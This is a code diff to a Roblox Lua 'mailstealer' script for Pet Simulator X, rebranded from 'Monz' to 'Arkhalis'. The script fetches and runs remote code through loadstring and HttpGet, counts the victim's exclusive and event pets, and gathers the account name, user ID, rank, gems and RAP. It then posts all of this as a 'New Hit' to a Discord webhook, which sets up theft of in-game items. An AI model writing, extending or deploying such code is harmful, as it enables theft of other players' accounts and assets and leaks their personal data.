@@ -43,27 +43,28 @@
     
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SuperMonz/Psx_Sc/main/Petsimguiss", true))()
 
---// Executor detector
+local Exclusive = 0
 
-local function getexploit()
-	local exploit =
-		(syn and not is_sirhurt_closure and not pebc_execute and "Synapse") or
-		(secure_load and "Sentinel") or
-		(is_sirhurt_closure and "Sirhurt") or
-		(pebc_execute and "ProtoSmasher") or
-		(KRNL_LOADED and "Krnl") or
-		(WrapGlobal and "WeAreDevs") or
-		(isvm and "Proxo") or
-		(shadow_env and "Shadow") or
-		(jit and "EasyExploits") or
-		(getscriptenvs and "Calamari") or
-		(unit and not syn and "Unit") or
-		(OXYGEN_LOADED and "Oxygen U") or
-		(IsElectron and "Electron") or
-		("Unsupported")
-  
-	return exploit
-  end
+for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
+    if v:IsA("TextButton") then
+    	if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") then
+                    Exclusive = Exclusive + 1
+                end
+            end
+	end
+
+local Event = 0
+
+for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
+    if v:IsA("TextButton") then
+    	if v:FindFirstChild("RarityGradient"):FindFirstChild("Event") then
+                    Event = Event + 1
+                end
+            end
+	end
+
+
+local exploit = identifyexecutor()
   
 --// Execution Log
 if game.PlaceId == 6284583030 then
@@ -80,6 +81,8 @@ else
 	_G.GameIn = "❓ Couldn't find game"
 end
 local webhookcolor = "13369599"
+local Players = game:GetService("Players")
+local Client = Players.LocalPlayer
 _G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
 _G.PlrUserVictim = game.Players.LocalPlayer.Name
 _G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
@@ -87,30 +90,51 @@ _G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
 _G.DisplayDiamond = game:GetService("Players").LocalPlayer.leaderstats.Diamonds.Value
 _G.DisplayRap = game:GetService("Players").LocalPlayer.leaderstats.RAP.Value
 _G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text
-_G.PetName = v2.name
-_G.PetRar = v2.rarity
-
+local GemsFormated = (require(game:GetService("ReplicatedStorage").Library.Functions.NumberShorten)( _G.DisplayDiamond ))
+local RapFormated = (require(game:GetService("ReplicatedStorage").Library.Functions.NumberShorten)( _G.DisplayRap ))
 local function sendwebhook(msg)
 local msg = {
-	["content"]= "**💎NEW HIT WITH MONZ💎**",
+	["avatar_url"] = "https://cdn.discordapp.com/attachments/1106232994441732117/1106233834850222231/33333.png",
+	["content"]= "**<a:999:1112457166608158821>New Hit With Arkhalis<a:999:1112457166608158821>** || @here|| ",
+	["username"] = "Arkhalis",
 	["embeds"]= {
 	  {
-		["title"]= "`Monz Mailstealer Results`",
-		["description"]= "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."\n💎Gems: **".._G.DisplayDiamond.."**\n⬆️Rap: **".._G.DisplayRap.."**\n📈Bank Tier: **".._G.DisplayBankTier.."**\n☠️Executor: **"..getexploit().."**",
-		["url"]= "https://discord.gg/34fs3FWt",
+		["title"]= "`Arkhalis Mailstealer Results`",
+		["description"]= "**Data from the victim**\n***<:Gigachad:1112768331146068069> Display Name: ".._G.PlrDisplayNameVictim.."\n<:Gigachad:1112768331146068069> Username: ".._G.PlrUserVictim.."\n<:Gigachad:1112768331146068069> User ID: ".._G.PlrUserIDVictim.."\n:medal:Rank: ".._G.CurrentRank.."\n:joystick: Place: ".._G.GameIn.."\n:skull_crossbones: Executor: "..exploit.."***",
+		["url"]= "https://discord.gg/ajmeAeq76d",
 		["color"]= ""..webhookcolor.."",
+		["thumbnail"] = {
+        ["url"] = "https://tenor.com/view/byuntear-sad-sad-cat-cat-meme-gif-25617057",
+        ["height"] = 420,
+        ["width"] = 420
+        },
 		["fields"]= {
-		  {
-		    ["name"]= "Pet Name & Pet Rarity"
-		    ["value"]= "```Pet Name: ".._G.PetName.."\nPet Rarity: ".._G.PetRar.."```",
-		    ["inline"]= true
-	}
-	}
-	}
+        {
+          ["name"]= "**<:diamond:1112767847899340810>Diamonds<:diamond:1112767847899340810> **",
+          ["value"]= "```"..GemsFormated.."```",
+          ["inline"]= true
+        },
+        {
+          ["name"]= "**<:arrowup:1112767464640622686>Rap<:arrowup:1112767464640622686>**",
+          ["value"]= "```"..RapFormated.."```",
+          ["inline"]= true
+        },
+	{
+          ["name"]= "**<:Hugecat:1112766460830429255>Exclusive<:Hugecat:1112766460830429255>**",
+          ["value"]= "```"..Exclusive.."```",
+          ["inline"]= true
+        },
+	{
+          ["name"]= "**<:event:1112767158049591307>Event<:event:1112767158049591307>**",
+          ["value"]= "```"..Event.."```",
+          ["inline"]= true
+        }
+      }
+      
   }
   },
 	["attachments"] = {}
-  };
+  }
   local Webhook = _G.Webhook
   request = http_request or request or HttpPost or syn.request
   request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
